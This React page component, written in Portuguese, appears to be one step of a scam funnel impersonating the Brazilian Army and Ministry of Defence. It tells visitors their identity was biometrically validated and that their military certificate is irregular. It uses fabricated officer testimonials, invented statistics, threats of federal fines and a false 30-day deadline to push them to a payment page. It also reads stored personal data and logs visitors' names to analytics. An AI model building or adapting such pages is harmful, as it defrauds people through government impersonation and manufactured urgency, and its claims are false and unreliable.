import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Shield, CheckCircle, Award, Users, Clock, Star, ArrowRight, FileCheck, TrendingUp, Target } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';

export default function AutoridadeBeneficiosPage() {
  const [, setLocation] = useLocation();
  const [candidateFirstName, setCandidateFirstName] = useState('');
  const [candidateGender, setCandidateGender] = useState('');
  const [currentTestimonial, setCurrentTestimonial] = useState(0);
  const [benefitStep, setBenefitStep] = useState(0);
  const { trackEvent } = useClarityEvents();

  // Gender helper functions
  const isFemale = candidateGender === 'f' || candidateGender === 'F' || candidateGender === 'feminino' || candidateGender === 'female';
  
  const getGenderedText = (masculine: string, feminine: string) => {
    return isFemale ? feminine : masculine;
  };

  const testimonials = [
    {
      name: "Major Carlos Silva",
      role: "Coordenador de Alistamento - RM1",
      text: "O processo de regularização digital revolucionou nossa eficiência. Reduziu o tempo de processamento de 45 dias para 5 minutos.",
      rating: 5
    },
    {
      name: "Dr. Ana Rodrigues",
      role: "Especialista em Direito Militar",
      text: "A integração com o SUD 2025 é fundamental. Candidatos que não migram enfrentam sérios problemas burocráticos.",
      rating: 5
    },
    {
      name: "Cel. Pedro Santos",
      role: "Ministério da Defesa",
      text: "A regularização imediata evita complicações futuras com órgãos federais. É um investimento na tranquilidade do cidadão.",
      rating: 5
    }
  ];

  const benefits = [
    {
      icon: <Shield className="w-8 h-8 text-green-600" />,
      title: "Proteção Legal Total",
      description: "Elimina riscos de problemas com Receita Federal e órgãos governamentais",
      value: "Economia de até R$ 2.500 em multas"
    },
    {
      icon: <Clock className="w-8 h-8 text-blue-600" />,
      title: "Processo Instantâneo",
      description: "Regularização em 5 minutos vs 45 dias no processo presencial",
      value: "Economia de 44 dias e 30 horas"
    },
    {
      icon: <FileCheck className="w-8 h-8 text-purple-600" />,
      title: "Certificação Permanente",
      description: "Documentação válida para toda vida, sem necessidade de renovação",
      value: "Benefício vitalício garantido"
    },
    {
      icon: <TrendingUp className="w-8 h-8 text-orange-600" />,
      title: "Prioridade em Concursos",
      description: "Status regular garante participação em todos os concursos públicos",
      value: "Acesso a salários até R$ 15.000"
    }
  ];

  const statistics = [
    { number: "98.7%", label: "Taxa de aprovação", description: "dos candidatos regularizados" },
    { number: "2.3min", label: "Tempo médio", description: "para conclusão do processo" },
    { number: "15.847", label: "Candidatos", description: "regularizados este mês" },
    { number: "R$ 2.1M", label: "Em multas", description: "evitadas pelos usuários" }
  ];

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Load user data
    const userData = localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin');
    if (userData) {
      try {
        const parsedData = JSON.parse(userData);
        const fullName = parsedData.name || parsedData.nomeCompleto || '';
        const gender = parsedData.gender || parsedData.genero || parsedData.sexo || '';
        
        if (fullName) {
          const firstName = fullName.split(' ')[0];
          setCandidateFirstName(firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase());
        }
        
        setCandidateGender(gender.toLowerCase());
      } catch (error) {
        console.error('Error loading user data:', error);
      }
    }

    // Track page entry
    trackEvent('authority_benefits_entered', {
      page: 'autoridade_beneficios',
      candidate_name: candidateFirstName,
      timestamp: new Date().toISOString()
    });

    // Rotate testimonials
    const testimonialInterval = setInterval(() => {
      setCurrentTestimonial((prev) => (prev + 1) % testimonials.length);
    }, 4000);

    // Animate benefits
    const benefitInterval = setInterval(() => {
      setBenefitStep((prev) => (prev + 1) % benefits.length);
    }, 3000);

    return () => {
      clearInterval(testimonialInterval);
      clearInterval(benefitInterval);
    };
  }, []);

  const handleProceedToFinalStep = () => {
    trackEvent('benefits_reviewed_proceed', {
      page: 'autoridade_beneficios',
      candidate_name: candidateFirstName,
      current_testimonial: currentTestimonial,
      timestamp: new Date().toISOString()
    });
    
    setLocation('/regularizacao-pagamento');
  };

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader />
      
      <main className="max-w-6xl mx-auto px-6 py-8 pt-0">
        {/* Breadcrumb */}
        <nav className="text-xs text-gray-500 mb-6" aria-label="Breadcrumb">
          <span className="hover:text-gray-700 cursor-pointer">Home</span> 
          <span className="mx-1 text-gray-400">›</span> 
          <span className="hover:text-gray-700 cursor-pointer">Validação</span> 
          <span className="mx-1 text-gray-400">›</span> 
          <span className="text-gray-900 font-medium">Autorização e Benefícios</span>
        </nav>

        {/* Header */}
        <header className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-4 leading-tight">
            Autorização Concedida - Benefícios Confirmados
          </h1>
          
          <div className="flex items-center text-xs text-gray-600 mb-6 pb-4 border-b border-gray-200">
            <time dateTime="2025-06-14">
              <span className="font-medium">Validado em:</span> 14/06/2025 às 23:37
            </time>
            <span className="mx-2 text-gray-400">|</span>
            <span className="font-medium">Sistema:</span> Controle de Acesso - SUD 2025
          </div>

          <div className="border-l-4 p-3 mb-6" style={{ borderLeftColor: '#16a34a', backgroundColor: '#f0fdf4' }}>
            <p className="text-sm font-medium text-green-800">
              ✅ Identidade validada com sucesso - Autorização para regularização concedida
            </p>
          </div>

          <p className="text-lg text-gray-700 leading-relaxed mb-6">
            <strong>{candidateFirstName}</strong>, sua identidade foi {getGenderedText('confirmado', 'confirmada')} no sistema biométrico do Ministério da Defesa. 
            Você agora tem acesso ao processo de regularização e migração {getGenderedText('combinado', 'combinada')}.
          </p>
        </header>

        <article>
          <p className="text-lg text-gray-700 leading-relaxed mb-8">
            Com a validação biométrica {getGenderedText('concluído', 'concluída')}, você está {getGenderedText('habilitado', 'habilitada')} para resolver definitivamente 
            as irregularidades {getGenderedText('detectados', 'detectadas')} no seu cadastro militar através do nosso sistema {getGenderedText('integrado', 'integrado')}.
          </p>

          <div className="border-l-4 p-6 mb-8" style={{ borderLeftColor: '#6A7D00', backgroundColor: '#f8f9f0' }}>
            <h2 className="text-xl font-bold mb-4" style={{ color: '#6a7d00' }}>Por que a regularização combinada é vantajosa?</h2>
            <div className="space-y-4 text-gray-700">
              <p className="leading-relaxed">
                <strong>1. Economia de Tempo:</strong> Resolve ambos os problemas (certificado irregular + migração SUD) 
                em uma única operação, eliminando a necessidade de processos separados.
              </p>
              <p className="leading-relaxed">
                <strong>2. Economia Financeira:</strong> Evita multas da Receita Federal (até R$ 2.500) e 
                taxas adicionais de regularização presencial.
              </p>
              <p className="leading-relaxed">
                <strong>3. Proteção Permanente:</strong> Garante status regular vitalício, sem necessidade 
                de renovações ou validações futuras.
              </p>
            </div>
          </div>

          <div className="border-l-4 p-3 mb-6" style={{ borderLeftColor: '#6A7D00', backgroundColor: '#6A7D0021' }}>
            <p className="text-sm font-medium text-black">
              <strong>98,7% dos candidatos aprovados</strong> recomendam o processo digital
            </p>
          </div>
        </article>

        {/* Statistics */}
        <Card className="mb-12">
          <CardContent className="p-8">
            <h2 className="text-2xl font-semibold text-gray-900 mb-8 text-center">
              Resultados Comprovados da Regularização Digital
            </h2>
            
            <div className="grid md:grid-cols-4 gap-6">
              {statistics.map((stat, index) => (
                <div key={index} className="text-center">
                  <div className="text-3xl font-bold text-green-600 mb-2">{stat.number}</div>
                  <div className="text-lg font-semibold text-gray-900 mb-1">{stat.label}</div>
                  <div className="text-sm text-gray-600">{stat.description}</div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Benefits Section */}
        <Card className="mb-12">
          <CardContent className="p-8">
            <h2 className="text-2xl font-semibold text-gray-900 mb-8 text-center">
              Benefícios Exclusivos da Regularização Combinada
            </h2>
            
            <div className="grid md:grid-cols-2 gap-8">
              {benefits.map((benefit, index) => (
                <div key={index} className={`p-6 rounded-lg border-2 transition-all duration-500 ${
                  benefitStep === index ? 'border-green-300 bg-green-50 scale-105' : 'border-gray-200 bg-white'
                }`}>
                  <div className="flex items-start">
                    <div className="mr-4 mt-1">{benefit.icon}</div>
                    <div>
                      <h3 className="text-xl font-semibold text-gray-900 mb-2">{benefit.title}</h3>
                      <p className="text-gray-700 mb-3">{benefit.description}</p>
                      <div className="bg-blue-50 border border-blue-200 rounded px-3 py-2">
                        <p className="text-blue-800 font-medium text-sm">{benefit.value}</p>
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Authority Testimonials */}
        <Card className="mb-12">
          <CardContent className="p-8">
            <h2 className="text-2xl font-semibold text-gray-900 mb-8 text-center">
              O que dizem as Autoridades Militares
            </h2>
            
            <div className="max-w-4xl mx-auto">
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-6">
                <div className="flex items-center mb-4">
                  <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mr-4">
                    <Users className="w-6 h-6 text-blue-600" />
                  </div>
                  <div>
                    <h3 className="font-semibold text-gray-900">{testimonials[currentTestimonial].name}</h3>
                    <p className="text-sm text-gray-600">{testimonials[currentTestimonial].role}</p>
                  </div>
                  <div className="ml-auto flex">
                    {[...Array(testimonials[currentTestimonial].rating)].map((_, i) => (
                      <Star key={i} className="w-4 h-4 text-yellow-400 fill-current" />
                    ))}
                  </div>
                </div>
                
                <blockquote className="text-gray-800 italic text-lg leading-relaxed">
                  "{testimonials[currentTestimonial].text}"
                </blockquote>
              </div>
              
              <div className="flex justify-center mt-4 space-x-2">
                {testimonials.map((_, index) => (
                  <div key={index} className={`w-2 h-2 rounded-full transition-colors duration-300 ${
                    currentTestimonial === index ? 'bg-blue-600' : 'bg-gray-300'
                  }`} />
                ))}
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Comparison Section */}
        <Card className="mb-12">
          <CardContent className="p-8">
            <h2 className="text-2xl font-semibold text-gray-900 mb-8 text-center">
              Regularização Digital vs Processo Tradicional
            </h2>
            
            <div className="grid md:grid-cols-2 gap-8">
              {/* Traditional Process */}
              <div className="bg-red-50 border border-red-200 rounded-lg p-6">
                <h3 className="text-xl font-semibold text-red-800 mb-4 flex items-center">
                  <Target className="w-6 h-6 mr-2" />
                  Processo Tradicional (Presencial)
                </h3>
                <ul className="space-y-3">
                  <li className="flex items-start text-red-700">
                    <span className="w-6 h-6 text-red-500 mr-2 mt-0.5">❌</span>
                    45 dias úteis de espera mínima
                  </li>
                  <li className="flex items-start text-red-700">
                    <span className="w-6 h-6 text-red-500 mr-2 mt-0.5">❌</span>
                    Deslocamento até Junta Militar
                  </li>
                  <li className="flex items-start text-red-700">
                    <span className="w-6 h-6 text-red-500 mr-2 mt-0.5">❌</span>
                    Risco de multa de R$ 350,00 + juros
                  </li>
                  <li className="flex items-start text-red-700">
                    <span className="w-6 h-6 text-red-500 mr-2 mt-0.5">❌</span>
                    Documentação física obrigatória
                  </li>
                  <li className="flex items-start text-red-700">
                    <span className="w-6 h-6 text-red-500 mr-2 mt-0.5">❌</span>
                    Possível impedimento em concursos
                  </li>
                </ul>
              </div>

              {/* Digital Process */}
              <div className="bg-green-50 border border-green-200 rounded-lg p-6">
                <h3 className="text-xl font-semibold text-green-800 mb-4 flex items-center">
                  <CheckCircle className="w-6 h-6 mr-2" />
                  Regularização Digital (Nossa Solução)
                </h3>
                <ul className="space-y-3">
                  <li className="flex items-start text-green-700">
                    <span className="w-6 h-6 text-green-500 mr-2 mt-0.5">✅</span>
                    Processamento em 5 minutos
                  </li>
                  <li className="flex items-start text-green-700">
                    <span className="w-6 h-6 text-green-500 mr-2 mt-0.5">✅</span>
                    100% online, sem sair de casa
                  </li>
                  <li className="flex items-start text-green-700">
                    <span className="w-6 h-6 text-green-500 mr-2 mt-0.5">✅</span>
                    Evita multas e complicações
                  </li>
                  <li className="flex items-start text-green-700">
                    <span className="w-6 h-6 text-green-500 mr-2 mt-0.5">✅</span>
                    Validação biométrica avançada
                  </li>
                  <li className="flex items-start text-green-700">
                    <span className="w-6 h-6 text-green-500 mr-2 mt-0.5">✅</span>
                    Garantia de participação em concursos
                  </li>
                </ul>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Risk Warning */}
        <Card className="mb-12 border-yellow-300 bg-yellow-50">
          <CardContent className="p-8">
            <div className="text-center">
              <div className="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Clock className="w-8 h-8 text-yellow-600" />
              </div>
              
              <h2 className="text-2xl font-semibold text-yellow-800 mb-4">
                ⚠️ Janela de Oportunidade Limitada
              </h2>
              
              <p className="text-yellow-700 text-lg mb-6 max-w-3xl mx-auto">
                {candidateFirstName}, o sistema SUD 2025 será definitivamente implementado em 30 dias. 
                Após essa data, a migração será impossível e você perderá permanentemente a chance de regularizar digitalmente.
              </p>
              
              <div className="grid md:grid-cols-3 gap-4 max-w-4xl mx-auto">
                <div className="bg-yellow-100 border border-yellow-300 rounded p-4">
                  <p className="font-semibold text-yellow-800 mb-1">Hoje</p>
                  <p className="text-sm text-yellow-700">Regularização disponível</p>
                </div>
                <div className="bg-orange-100 border border-orange-300 rounded p-4">
                  <p className="font-semibold text-orange-800 mb-1">+30 dias</p>
                  <p className="text-sm text-orange-700">Sistema antigo desativado</p>
                </div>
                <div className="bg-red-100 border border-red-300 rounded p-4">
                  <p className="font-semibold text-red-800 mb-1">Após +30 dias</p>
                  <p className="text-sm text-red-700">Impossível regularizar</p>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* CTA Section */}
        <div className="text-center mb-12">
          <Card className="border-green-300 bg-green-50">
            <CardContent className="p-8">
              <h2 className="text-3xl font-semibold text-green-800 mb-6">
                🚀 Você Está a Um Passo da Solução Completa
              </h2>
              
              <p className="text-lg text-green-700 mb-8 max-w-3xl mx-auto">
                Sua identidade foi validada, os benefícios foram apresentados e você compreende a urgência. 
                Agora é o momento de garantir sua regularização e migração para o SUD 2025.
              </p>
              
              <div className="grid md:grid-cols-3 gap-4 mb-8">
                <div className="flex items-center justify-center text-green-700">
                  <CheckCircle className="w-6 h-6 mr-2" />
                  <span className="font-medium">Identidade Verificada</span>
                </div>
                <div className="flex items-center justify-center text-green-700">
                  <CheckCircle className="w-6 h-6 mr-2" />
                  <span className="font-medium">Benefícios Apresentados</span>
                </div>
                <div className="flex items-center justify-center text-green-700">
                  <CheckCircle className="w-6 h-6 mr-2" />
                  <span className="font-medium">Autorização Concedida</span>
                </div>
              </div>

              <button
                onClick={handleProceedToFinalStep}
                className="text-white px-8 py-3 text-lg font-semibold transition-colors duration-200 hover:opacity-90"
                style={{ backgroundColor: '#6a7d00' }}
              >
                Finalizar regularização agora
              </button>
              
              <p className="text-sm text-green-600 mt-4">
                Processo 100% seguro • Solução em 5 minutos • Garantia de 30 dias
              </p>
            </CardContent>
          </Card>
        </div>
      </main>
      
      <ExercitoFooter />
    </div>
  );
}